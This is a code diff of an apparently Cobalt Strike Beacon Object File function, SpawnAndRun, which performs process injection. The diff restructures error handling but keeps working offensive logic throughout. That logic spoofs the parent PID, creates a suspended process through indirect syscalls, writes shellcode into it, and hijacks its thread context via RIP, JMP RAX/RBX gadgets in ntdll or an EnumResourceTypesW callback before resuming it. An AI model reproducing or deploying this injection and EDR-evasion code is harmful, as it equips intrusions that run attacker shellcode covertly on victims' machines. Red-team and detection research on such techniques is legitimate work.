@@ -213,6 +213,10 @@ NTSTATUS	SpawnAndRun(
 
 	DWORD	dwProcessParentId = 0;
 	HANDLE	hParentProcess = NULL;
+	HANDLE	hProcess = NULL;
+	HANDLE	hThread = NULL;
+	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
+	PPS_ATTRIBUTE_LIST AttributeList = NULL;
 
 	UNICODE_STRING	ImagePath = { 0 };
 	UNICODE_STRING	CurrentDirectory = { 0 };
@@ -222,11 +226,10 @@ NTSTATUS	SpawnAndRun(
 	RtlInitUnicodeString(&CurrentDirectory, lpwWorkingDir);
 	RtlInitUnicodeString(&CmdLine, lpwCmdLine);
 
-	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
 	Status = RtlCreateProcessParametersEx(&ProcessParameters, &ImagePath, NULL, &CurrentDirectory, &CmdLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
 	if (NT_ERROR(Status)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] RtlCreateProcessParametersEx failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 
 	PS_CREATE_INFO CreateInfo = { 0 };
@@ -248,7 +251,8 @@ NTSTATUS	SpawnAndRun(
 			
 		if (!GetProcessIdWithNameW(lpwParentProcessName, &dwProcessParentId)) {
 			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find parent process: %ws", lpwParentProcessName);
-			return STATUS_INVALID_PARAMETER_2;
+			Status = STATUS_INVALID_PARAMETER_2;
+			goto cleanup;
 		}
 		// BeaconPrintf(CALLBACK_OUTPUT, "[*] Spoofing PPID with process %ws (PID: %d)", lpwParentProcessName, dwProcessParentId);
 
@@ -260,15 +264,16 @@ NTSTATUS	SpawnAndRun(
 		Status = DRAUGR_SYSCALL(NtOpenProcess, &hParentProcess, PROCESS_ALL_ACCESS, &oA, &cId);
 		if (NT_ERROR(Status)) {
             BeaconPrintf(CALLBACK_ERROR, "[!] NtOpenProcess failed at line %d with status 0x%llx", __LINE__, Status);
-			return Status;
+			goto cleanup;
 		}
 	}
 
 	DWORD AttributeSize = sizeof(PS_ATTRIBUTE_LIST) + (NbrOfAttributes * sizeof(PS_ATTRIBUTE));
 
-	PPS_ATTRIBUTE_LIST AttributeList = (PPS_ATTRIBUTE_LIST)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, AttributeSize);
+	AttributeList = (PPS_ATTRIBUTE_LIST)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, AttributeSize);
 	if (!AttributeList) {
-		return STATUS_INSUFFICIENT_RESOURCES;
+		Status = STATUS_INSUFFICIENT_RESOURCES;
+		goto cleanup;
 	}
 
 	DWORD64	dwProcessPolicy = 0;
@@ -306,13 +311,10 @@ NTSTATUS	SpawnAndRun(
 		AttributeList->Attributes[cx].Value = hParentProcess;
 	}
 
-	HANDLE hProcess = NULL;
-	HANDLE hThread = NULL;
-
 	Status = DRAUGR_SYSCALL(NtCreateUserProcess, &hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
 	if (NT_ERROR(Status)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateUserProcess failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 
 	/*	-------------------
@@ -330,7 +332,7 @@ NTSTATUS	SpawnAndRun(
 	
 	if (NT_ERROR(Status)) {
 	    BeaconPrintf(CALLBACK_ERROR, "[!] NtAllocateVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 	
 	/*	-------------------
@@ -340,7 +342,7 @@ NTSTATUS	SpawnAndRun(
 	Status = DRAUGR_SYSCALL(NtWriteVirtualMemory, hProcess, lpAllocatedAddress, Shellcode, ShellcodeSize, &nWrittenBytes);
 	if (NT_ERROR(Status)) {
 	    BeaconPrintf(CALLBACK_ERROR, "[!] NtWriteVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 
 	/*	-------------------
@@ -350,7 +352,8 @@ NTSTATUS	SpawnAndRun(
 
 	if (Execute == HIJACK_RIP_CALLBACK_FUNCTION && !DisableCfg) {
 		BeaconPrintf(CALLBACK_ERROR, "[!] callback blocked (cfg-disable is off) | next step: enable CFG-disable, then retry");
-		return STATUS_INVALID_PARAMETER;
+		Status = STATUS_INVALID_PARAMETER;
+		goto cleanup;
 	}
 
 	switch (Execute) {
@@ -362,7 +365,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 
 			Ctx.Rip = (DWORD64)lpAllocatedAddress;
@@ -370,7 +373,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 			break;
 		}
@@ -384,7 +387,8 @@ NTSTATUS	SpawnAndRun(
 			PVOID GadgetJmpRax = NULL;
 			if (!FindGadget(Ntdll, MODULE_SIZE(Ntdll), &JmpRax, sizeof(JmpRax), &GadgetJmpRax)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find JMP RAX gadget in ntdll.dll");
-				return STATUS_DATA_ERROR;
+				Status = STATUS_DATA_ERROR;
+				goto cleanup;
 			}
 
 			CONTEXT Ctx = { 0 };
@@ -393,7 +397,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 
 			Ctx.Rax = (DWORD64)lpAllocatedAddress;
@@ -402,7 +406,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 			break;
 		}
@@ -416,7 +420,8 @@ NTSTATUS	SpawnAndRun(
 			PVOID GadgetJmpRbx = NULL;
 			if (!FindGadget(Ntdll, MODULE_SIZE(Ntdll), &JmpRbx, sizeof(JmpRbx), &GadgetJmpRbx)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find JMP RBX gadget in ntdll.dll");
-				return STATUS_DATA_ERROR;
+				Status = STATUS_DATA_ERROR;
+				goto cleanup;
 			}
 
 			CONTEXT Ctx = { 0 };
@@ -425,7 +430,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 
 			Ctx.Rbx = (DWORD64)lpAllocatedAddress;
@@ -434,7 +439,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 			break;
 		}
@@ -445,7 +450,8 @@ NTSTATUS	SpawnAndRun(
 			PVOID	CallbackFunction = GetProcAddress(Kernel32, "EnumResourceTypesW");
 			if (!CallbackFunction) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find EnumResourceTypesW");
-				return STATUS_PROCEDURE_NOT_FOUND;
+				Status = STATUS_PROCEDURE_NOT_FOUND;
+				goto cleanup;
 			}
 
 			CONTEXT Ctx = { 0 };
@@ -454,7 +460,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 
 			Ctx.Rcx = NULL;
@@ -465,7 +471,7 @@ NTSTATUS	SpawnAndRun(
 			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
 			if (NT_ERROR(Status)) {
 				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
-				return Status;
+				goto cleanup;
 			}
 			break;
 		}
@@ -475,15 +481,16 @@ NTSTATUS	SpawnAndRun(
 		Status = DRAUGR_SYSCALL(NtProtectVirtualMemory, hProcess, &lpAllocatedAddress, &nTempSize, PAGE_EXECUTE_READ, &oldProtect);
 		if (NT_ERROR(Status)) {
 	    	BeaconPrintf(CALLBACK_ERROR, "[!] NtProtectVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
-			return Status;
+			goto cleanup;
 		}
 	}
 	Status = DRAUGR_SYSCALL(NtResumeProcess, hProcess);
 	if (NT_ERROR(Status)) {
 	    BeaconPrintf(CALLBACK_ERROR, "[!] NtResumeProcess failed at line %d with status 0x%llx", __LINE__, Status);
-		return Status;
+		goto cleanup;
 	}
 
+cleanup:
 	return Status;
 }
 
